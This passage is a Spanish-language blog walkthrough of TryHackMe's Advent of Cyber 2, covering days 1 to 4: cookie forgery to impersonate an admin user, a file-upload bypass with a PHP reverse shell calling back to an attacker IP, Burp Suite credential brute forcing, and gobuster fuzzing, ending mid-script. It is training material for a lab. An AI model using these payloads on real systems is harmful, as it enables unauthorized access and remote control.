    var mobileSearchContainer = document.querySelector('#search-mobile-container');
    var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
    var htmlElem = document.querySelector('html');

    if (mobileSearchClassElem) {
      mobileSearchClassElem.style.display = 'none';
    }

    mobileSearchBtnElem ? 
    mobileSearchBtnElem.addEventListener('click', function () {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'block';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.focus();
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'hidden';
      }
    }) : null;

    mobileSearchCloseBtnElem ? 
    mobileSearchCloseBtnElem.addEventListener('click', function() {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'none';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.value = '';
      }
      
      if (mobileSearchResultsElem) {
        while (mobileSearchResultsElem.firstChild) {
          mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
        }
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'visible';
      }
    }) : null;

    mobileSearchInputElem ?
    mobileSearchInputElem.addEventListener('keydown', function(e) {
      var keyCode = e.which || e.keyCode;
      if (e.key === 'Escape' || keyCode === 27) {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'none';
        }
        
        if (mobileSearchInputElem) {
          mobileSearchInputElem.value = '';
        }

        if (mobileSearchResultsElem) {
          while (mobileSearchResultsElem.firstChild) {
            mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
          }
        }
        if (htmlElem) {
          htmlElem.style.overflowY = 'visible';
        }
      }
    }) : null;
  


  
    function renderSearchResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');
      
      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }

    function renderSearchHighlightResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');

      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeHighlightLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }
  
  });
</script>    
    


<link rel="stylesheet" href="/css/main.min.css">



  
  
    
    <link rel="stylesheet" href="/css/custom.min.css">
  


    
<meta name="description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español" />


<meta name="keywords" content="web,reversing,networking,scripting,python,blue,">

<meta name="created" content="2020-12-24T00:00:00&#43;0000">
<meta name="modified" content="2020-12-24T00:00:00&#43;0000">
<meta property="article:published_time" content="2020-12-24T00:00:00&#43;0000">

<meta name="author" content="sckull">
<meta property="article:author" content="https://sckull.github.io/posts/aoc2020/@sckull">


<meta property="og:site_name" content="sckull">
<meta property="og:title" content="TryHackMe - Advent of Cyber 2">
<meta property="og:url" content="https://sckull.github.io/posts/aoc2020/">
<meta property="og:type" content="article">
<meta property="og:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">

  
    <meta property="og:image" content="https://sckull.github.io/images/posts/thm/aoc2/cover.png">
    <meta property="og:image:url" content="https://sckull.github.io/images/posts/thm/aoc2/cover.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:app:name:iphone" content="sckull">
    <meta property="twitter:title" content="TryHackMe - Advent of Cyber 2">
    <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
  

<meta name="generator" content="Hugo 0.68.3" />
<meta name="msapplication-TileColor" content="#1d1d1d">

<meta name="theme-color" content="#1d1d1d">

<meta name="msapplication-navbutton-color" content="#1d1d1d">

<meta name="apple-mobile-web-app-status-bar-style" content="#1d1d1d">

<link rel="canonical" href="https://sckull.github.io/posts/aoc2020/">



  
  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/favicon.png" sizes="any" type="image/png" />
  


    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "headline": "TryHackMe - Advent of Cyber 2",
    "datePublished": "2020-12-24T00:00:00Z",
    "dateModified": "2020-12-24T00:00:00Z",
    "url" : "https://sckull.github.io/posts/aoc2020/",
    "description": "Advent of Cyber 2 una serie de retos orientados al aprendizaje de herramientas y conceptos de seguridad, liberados diariamente durante 25 dias.",
    "keywords": ["web","reversing","networking","scripting","python","blue",""],
    "image" : "https://sckull.github.io/images/posts/thm/aoc2/cover.png",
    "author": {
      "@type": "Person",
      "name": "sckull"
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://sckull.github.io/"
    },
    "publisher": {
      "@type": "Organization",
      "name": "sckull",
      "url": "https://sckull.github.io/"
    }
  }
</script>

    
  
  







    
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet"> 


</head>

<body id="root" class="theme__dark">
    <script>
        var localTheme = localStorage.getItem('theme');
        if (localTheme) {
            document.getElementById('root').className = 'theme__' + localTheme;
        }
    </script>
    <div id="container">
        





        <div class="wrapper" data-type="posts" data-kind="page">
            <nav class="navbar" role="navigation" aria-label="main navigation" data-dir="ltr">
  <div class="navbar__brand">
    
    &nbsp;&nbsp;
    
    
      <a href="/" title="Home" rel="home" class="navbar__title-link">
        <h6 class="navbar__title">&gt; sckull | blog<span class="logo__cursor"></span></h6>
      </a>
    
  </div>

  
<div class="theme theme-mobile" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" style="" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
      
    </div>
  </div>
</div>


<div id="mobileSearchBtn" class="mobile-search__btn" data-ani="true">
  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
</div>

<div id="search-mobile-container" class="mobile-search hide" data-dir="ltr">
  <div class="mobile-search__top">
    <input id="search-mobile" type="text" aria-label="Mobile Search" placeholder="Buscar" class="mobile-search__top--input"/>
    <div id="search-mobile-close" class="mobile-search__top--icon">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path opacity=".87" fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.59-13L12 10.59 8.41 7 7 8.41 10.59 12 7 15.59 8.41 17 12 13.41 15.59 17 17 15.59 13.41 12 17 8.41z"/></svg>
    </div>
  </div>
  <div id="search-mobile-results" class="mobile-search__body">
    
  </div>
</div>


<a role="button" class="navbar__burger" aria-label="menu" aria-expanded="false"
  data-ani="true">
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
</a>
<div class="navbarm__collapse" data-open="false">
  <ul dir="ltr">
    
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/#">
            CTF
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 9.29L12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41 0 .39.39.39 1.02 0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41 0L6.7 10.7c-.39-.39-.39-1.02 0-1.41.39-.38 1.03-.39 1.42 0z"/></svg>
          </a>
        </li>

        
          <li class="navbarm__menu--item navbarm__menu--subitem">
            <a href="/categories/tryhackme">TryHackMe</a>
          </li>
        
          <li class="navbarm__menu--item navbarm__menu--subitem">
            <a href="/categories/hackthebox">HackTheBox</a>
          </li>
        

      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/archive">Archive</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/tags">Tags</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/about">About</a>
        </li>
      
      
    

    
  </ul>
</div>
  <div class="navbar__menu">
  
<div class="theme" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
      
    </div>
  </div>
</div>

  
  
  
  
  
  
  
  <div class="navbar__dropdown navbar__slide-down" data-ani="true">
    <a href="/#" class="navbar__menu-item "
      dir="ltr">
      CTF
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 9.29L12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41 0 .39.39.39 1.02 0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41 0L6.7 10.7c-.39-.39-.39-1.02 0-1.41.39-.38 1.03-.39 1.42 0z"/></svg>
    </a>
    <div class="navbar__dropdown--content">
      
      <a href="/categories/tryhackme" class="navbar__dropdown--item" dir="ltr">TryHackMe</a>
      
      <a href="/categories/hackthebox" class="navbar__dropdown--item" dir="ltr">HackTheBox</a>
      
    </div>
  </div>
  
  
  
  
  
  
  
  <a href="/archive" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Archive</a>
  
  
  
  
  
  
  
  <a href="/tags" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Tags</a>
  
  
  
  
  
  
  
  <a href="/about" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">About</a>
  
  
</div>

</nav>
            


            

<main class="single__main main">
  
  
  <div class="single ">
    <div class="single__nojs">This page looks best with JavaScript enabled</div>
    <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
    <h2 class="single__title" data-ani="true">TryHackMe - Advent of Cyber 2</h2>
    <div class="single__meta">
      
<div class="single__infos">
  <time class="single__info" title="Written At">📅&nbsp;Dec 24, 2020 </time>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;52&nbsp;min read </span>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">✍️&nbsp;sckull</span>
  
  <span class="single__info">
    
  </span>
</div>
      
<ul class="single__tags caption">
  
  🏷️
  

  <li><a href="https://sckull.github.io/tags/" class="single__tag" title="Tags">#Tags</a></li>

  <li><a href="https://sckull.github.io/tags/blue/" class="single__tag" title="blue">#blue</a></li>

  <li><a href="https://sckull.github.io/tags/networking/" class="single__tag" title="networking">#networking</a></li>

  <li><a href="https://sckull.github.io/tags/python/" class="single__tag" title="python">#python</a></li>

  <li><a href="https://sckull.github.io/tags/reversing/" class="single__tag" title="reversing">#reversing</a></li>

  <li><a href="https://sckull.github.io/tags/scripting/" class="single__tag" title="scripting">#scripting</a></li>

  <li><a href="https://sckull.github.io/tags/web/" class="single__tag" title="web">#web</a></li>

</ul>
    </div>
    <article class="single__contents" data-dir="ltr" data-ani="true">
      
      <p>Advent of Cyber 2 una serie de retos orientados al aprendizaje de herramientas y conceptos de seguridad, liberados diariamente durante 25 dias.</p>




  



  <div class="featured-image__wrapper">
    <img src="/images/posts/thm/aoc2/cover.png" alt="featured image" class="featured-image" style="width: ;height: ;">
  </div>

<h3 id="informacion">Informacion</h3>
<table>
<thead>
<tr>
<th>Titulo</th>
<th>Advent of Cyber 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>Room</td>
<td>Advent of Cyber 2</td>
</tr>
<tr>
<td>Info</td>
<td>Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.</td>
</tr>
<tr>
<td>Maker</td>
<td><a href="https://tryhackme.com/p/tryhackme">TryHackMe</a> &amp; <a href="https://tryhackme.com/p/cmnatic">cmnatic</a> &amp; <a href="https://twitter.com/darkstar7471">DarkStar7471</a> &amp; <a href="https://youtube.com/johnhammond010">JohnHammond</a> &amp; <a href="https://twitter.com/TibSec">Tib3rius</a> &amp; <a href="https://twitter.com/thecybermentor">TCM</a></td>
</tr>
<tr>
<td>URL</td>
<td><a href="https://tryhackme.com/room/adventofcyber2">TryHackMe - AoC2</a></td>
</tr>
</tbody>
</table>
<h1 id="day-1---web-exploitation-">DAY 1 - Web Exploitation</h1>
<p>Presentan una web donde es necesario crear una cuenta y obtener diferentes valores.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_215214.png" alt="image" /></p>
<p>Primero es necesario crear una cuenta, luego de eso ingresar con las credenciales, y con la herramienta para desarrolladores de firefox obtenemos la cookie y el nombre de la misma.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_215522.png" alt="image" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">auth:7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a22757365726e616d65227d
</code></pre></td></tr></table>
</div>
</div><p>Utilizando <a href="https://gchq.github.io/CyberChef/"><strong>CyberCheff</strong></a> logramos obtener el valor real de la cookie el cual esta codificado en <code>hexadecimal</code> y esta en formato <code>json</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">{</span><span class="s2">&#34;company&#34;</span>:<span class="s2">&#34;The Best Festival Company&#34;</span>, <span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;username&#34;</span><span class="o">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Para poder realizar un &ldquo;bypass&rdquo; utilizamos el formato de la cookie y la codificacion utilizada, pasandole como usuario santa y codificandola nuevamente.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">{</span><span class="s2">&#34;company&#34;</span>:<span class="s2">&#34;The Best Festival Company&#34;</span>, <span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;santa&#34;</span><span class="o">}</span>
7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d
</code></pre></td></tr></table>
</div>
</div><p>Utilizando nuevamente la herramienta para desarrolladores de firefox en la seccion de <code>Storage &gt; Cookies</code>, creamos una nueva cookie con los valores:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">Name: auth
value: 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshot_20201210_222034.png" alt="image" /></p>
<p>Al recargar la pagina nos muestra las opciones pero en esta ocacion podemos activar todas y obtener nuestra flag.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_222200.png" alt="image" /></p>
<h1 id="day-2---web-exploitation-">DAY 2 - Web Exploitation</h1>
<p>Presentan un reto del tipo web donde nos dan un ID para auditar la aplicacion. Además se presenta un mensaje que indica que debemos de pasar el ID al parametro <code>?id=</code> a la aplicacion</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">For Elf McEager:
You have been assigned an ID number <span class="k">for</span> your audit of the system: ODIzODI5MTNiYmYw . Use this to gain access to the upload section of the site.
Good luck!
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshot_20201210_222828.png" alt="image" /></p>
<p>Al pasarle el valor (<code>/?id=ODIzODI5MTNiYmYw</code>) nos muestra una pagina nueva que permite seleccionar un archivo ha subir.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_223304.png" alt="image" /></p>
<p>En el codigo fuente de la pagina se muestra las extensiones aceptadas (<code>.jpeg,.jpg,.png</code>) de los archivos.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
	<span class="p">&lt;</span><span class="nt">ul</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lightrope&#34;</span><span class="p">&gt;&lt;</span><span class="nt">li</span><span class="p">&gt;</span>[... snip ...]<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
	<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">nose</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
	<span class="p">&lt;</span><span class="nt">main</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Protect the Factory!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>If you see any suspicious people near the factory, take a picture and upload it here!<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">file</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;chooseFile&#34;</span> <span class="na">accept</span><span class="o">=</span><span class="s">&#34;.jpeg,.jpg,.png&#34;</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">button</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">0</span> <span class="na">id</span><span class="o">=</span><span class="s">coverFile</span><span class="p">&gt;</span>Select<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">button</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">1</span> <span class="na">id</span><span class="o">=</span><span class="s">uploadFile</span><span class="p">&gt;</span>Submit<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">fileText</span><span class="p">&gt;</span>No file selected<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
	<span class="p">&lt;/</span><span class="nt">main</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Al subir una imagen la pagina no muestra ningun mensaje de la direccion donde está almacenada, utilizando la descripcion de <strong>File Uploads</strong> logramos encontrar la direccion donde se encuentra nuestra imagen.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_224128.png" alt="image" /></p>
<p>Para obtener nuestra flag creamos un archivo que contiene codigo en PHP para poder ejecutar una shell inversa.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ cat shell.jpg.php
&lt;?php exec<span class="o">(</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1338 0&gt;&amp;1&#39;</span><span class="o">)</span><span class="p">;</span> ?&gt;
</code></pre></td></tr></table>
</div>
</div><p>Con netcat a la escucha (<code>rlwrap nc -lvp 1338</code>), subimos nuestro archivo y visitamos el mismo como si fuera un pagina normal, lo cual ejecuto nuestra shell inversa y logramos obtener una shell y nuestra flag.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_224649.png" alt="image" /></p>
<h1 id="day-3---web-exploitation-">DAY 3 - Web Exploitation</h1>
<p>Nos presentan una pagina a la cual hay que realizar un ataque de fuerza bruta utilizando la herramienta <strong>Burpsuite</strong> tal y como se presenta en la descripcion del reto. Tambien proveen una lista de usuarios y contraseñas.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">Usuario  Contraseña
root 	root
admin 	password
user 	<span class="m">12345</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshot_20201210_225450.png" alt="image" /></p>
<p>Para realizar el ataque lo hacemos con la extension <code>FoxyProxy</code> o directamente en la configuracion de firefox para dirigir el trafico a Burpsuite mediante su proxy, y con esta herramienta poder manipular los parametros de interes.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_225416.png" alt="image" /></p>
<p>Primero debemos de enviar un usuario y contraseña, al realizar esto, en burpsuite nos muestra la solicitud a realizar donde vemos los valores enviados. Esta solicitud la enviamos al <code>Intruder</code> donde se muestran las posiciones del usuario y contraseña las cuales son marcadas para poder utilizar y cambiar los diferentes valores de un diccionario en cada solicitud.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_225613.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_225716.png" alt="image" /></p>
<p>En la ventana de <code>Payloads</code> pegamos para el primer parametro (usuario, payload set = 1) la lista dada o en el caso de que esté en un archivo se carga el mismo. Se configura el segundo parametro (contraseña, payload set = 1 ) y se cargan la lista o archivo, al tener estos valores configurados se lanza el ataque <em>(En caso de que sea la version gratuita de burpsuite solo configurar una posicion e intercambiar el nombre de usuario o contraseña manualmente, al ser una lista pequeña no toma mucho tiempo</em>). Al finalizar se muestra la lista de solicitudes, en una de ellas se muestra un mensaje diferente a los demas, donde indica que se encontró la contraseña.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_230310.png" alt="image" /></p>
<p>Utilizamos usuario y contraseña encontrado para obtener nuestra flag en la pagina.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201210_230546.png" alt="image" /></p>
<h1 id="day-4---web-exploitation-">DAY 4 - Web Exploitation</h1>
<p>Este dia presentan un reto web que incluye la explicacion del uso de herramientas WFUZZ y GOBUSTER para realizar fuzzing en paginas web. Tambien presentan que el parametro (<code>date</code>) del reto toma como valor una fecha en el formato <code>YYYYMMDD</code>.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201212_124014.png" alt="image" /></p>
<p>Para obtener la flag, primero es necesario ejecutar gobuster a la pagina web con el diccionario <code>big.txt</code> el cual nos muestra como resultado una direccion donde se encuentra una pagina web.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.57.57/ -w /usr/share/wordlists/dirb/big.txt 
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.57.57/
<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
<span class="o">===============================================================</span>
2020/12/12 13:37:27 Starting <span class="nv">gobuster</span>
<span class="o">===============================================================</span>
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
/LICENSE <span class="o">(</span>Status: 200<span class="o">)</span>
/api <span class="o">(</span>Status: 301<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
<span class="o">===============================================================</span>
2020/12/12 13:50:52 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshot_20201212_124144.png" alt="image" /></p>
<p>A dicha pagina web es necesario realizar fuzzing al parametro <code>date</code> para ello debemos de utilizar algun diccionario que contenga el formato <code>YYYYMMDD</code>, en este caso utilizamos python para generar nuestro diccionario en el formato presentado especificando año, mes y dia.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1990</span><span class="p">,</span> <span class="mi">2021</span><span class="p">):</span>
	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">13</span><span class="p">):</span>
		<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">):</span>			
			<span class="n">y</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
